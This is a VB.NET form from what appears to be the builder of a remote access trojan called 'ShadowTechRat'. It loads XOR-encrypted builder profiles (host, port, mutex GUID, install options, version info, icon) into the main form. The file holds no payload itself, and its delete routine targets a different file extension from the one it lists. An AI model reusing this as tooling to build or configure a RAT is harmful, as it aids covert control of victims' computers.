Imports System.IO
Public Class Profile

    Private Sub Profile_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        If Not Directory.Exists(Application.StartupPath & "\Profiles\") Then Directory.CreateDirectory(Application.StartupPath & "\Profiles\")
        Dim dir As New System.IO.DirectoryInfo(Application.StartupPath & "\Profiles\")
        For Each f As System.IO.FileInfo In dir.GetFiles("*.stp")
            Dim item As New ListViewItem With {.Text = f.Name.Substring(0, f.Name.LastIndexOf(".")), .ImageIndex = 0}
            For Each itm As ListViewItem In ListView1.Items
                If itm.Text = item.Text Then GoTo A
            Next
            ListView1.Items.Add(item)
A:
        Next
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If ListView1.SelectedItems.Count < 1 Then Exit Sub
        If ListView1.FocusedItem.Index = 0 Then
            ShadowTechRat.TextBox7.Text = "" : ShadowTechRat.TextBox8.Text = ""
            ShadowTechRat.TextBox9.Text = "" : ShadowTechRat.TextBox10.Text = ""
            ShadowTechRat.CheckBox3.Checked = False : ShadowTechRat.TextBox11.Text = ""
            ShadowTechRat.CheckBox4.Checked = False : ShadowTechRat.CheckBox5.Checked = False
            ShadowTechRat.TextBox12.Text = "" : ShadowTechRat.CheckBox6.Checked = False
            ShadowTechRat.ComboBox4.SelectedIndex = 0 : ShadowTechRat.ComboBox5.SelectedIndex = 0
            ShadowTechRat.TextBox13.Text = "" : ShadowTechRat.TextBox14.Text = ""
            ShadowTechRat.TextBox15.Text = "" : ShadowTechRat.TextBox16.Text = ""
            ShadowTechRat.TextBox17.Text = "" : ShadowTechRat.TextBox18.Text = ""
            ShadowTechRat.TextBox19.Text = "" : ShadowTechRat.NumericUpDown1.Value = 0
            ShadowTechRat.NumericUpDown2.Value = 0 : ShadowTechRat.NumericUpDown3.Value = 0
            ShadowTechRat.NumericUpDown4.Value = 0 : ShadowTechRat.PictureBox7.Image = Nothing
            ShadowTechRat.PictureBox7.Tag = Nothing : Me.Close()
        Else
            Dim settings() As String = Split(Encryption.XORDecryption(ShadowTechRat.key, IO.File.ReadAllText(Application.StartupPath & "\Profiles\" & ListView1.FocusedItem.Text & ".stp")), "|")
            Try
                If Convert.ToInt32(settings(1)) < 65536 Then ShadowTechRat.TextBox8.Text = settings(1) Else Throw New Exception
                ShadowTechRat.TextBox7.Text = settings(0)
                ShadowTechRat.TextBox9.Text = settings(2) : ShadowTechRat.TextBox10.Text = settings(3)
                If settings(4) = "True" Then ShadowTechRat.CheckBox3.Checked = True Else ShadowTechRat.CheckBox3.Checked = False
                If Not settings(5) = "" Then
                    Dim guid As String = settings(5).Substring(1, settings(5).Length - 2)
                    Dim newguid As New Guid(guid) : ShadowTechRat.TextBox11.Text = "{" & guid & "}"
                End If
                If settings(6) = "True" Then ShadowTechRat.CheckBox4.Checked = True Else ShadowTechRat.CheckBox4.Checked = False
                If settings(7) = "True" Then ShadowTechRat.CheckBox5.Checked = True Else ShadowTechRat.CheckBox5.Checked = False
                ShadowTechRat.TextBox12.Text = settings(8)
                If settings(9) = "True" Then ShadowTechRat.CheckBox6.Checked = True Else ShadowTechRat.CheckBox6.Checked = False
                ShadowTechRat.ComboBox4.SelectedIndex = Convert.ToInt32(settings(10))
                ShadowTechRat.ComboBox5.SelectedIndex = Convert.ToInt32(settings(11))
                ShadowTechRat.TextBox13.Text = settings(12)
                ShadowTechRat.TextBox14.Text = settings(13)
                ShadowTechRat.TextBox15.Text = settings(14)
                ShadowTechRat.TextBox16.Text = settings(15)
                ShadowTechRat.TextBox17.Text = settings(16)
                ShadowTechRat.TextBox18.Text = settings(17)
                ShadowTechRat.TextBox19.Text = settings(18)
                Dim version() As String = Split(settings(19), ".")
                ShadowTechRat.NumericUpDown1.Value = Convert.ToInt32(version(0))
                ShadowTechRat.NumericUpDown2.Value = Convert.ToInt32(version(1))
                ShadowTechRat.NumericUpDown3.Value = Convert.ToInt32(version(2))
                ShadowTechRat.NumericUpDown4.Value = Convert.ToInt32(version(3))
                If settings(20) = "" Then
                    ShadowTechRat.PictureBox7.Image = Nothing : ShadowTechRat.PictureBox7.Tag = Nothing
                Else
                    'Dim imageBytes As Byte() = Convert.FromBase64String(settings(20))
                    'Dim ms As New MemoryStream(imageBytes, 0, imageBytes.Length)
                    'ms.Write(imageBytes, 0, imageBytes.Length)
                    ShadowTechRat.PictureBox7.Image = Image.FromFile(settings(20))
                    ShadowTechRat.PictureBox7.Tag = settings(20)
                End If
                Me.Close()
            Catch
                MessageBox.Show("The selected profile is not valid.", "", MessageBoxButtons.OK, MessageBoxIcon.Information)
            End Try
        End If
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteToolStripMenuItem.Click
        Try
            If ListView1.SelectedItems.Count > 0 Then IO.File.Delete(Application.StartupPath & "\Profiles\" & ListView1.FocusedItem.Text & ".spf")
        Catch
        End Try
    End Sub
End Class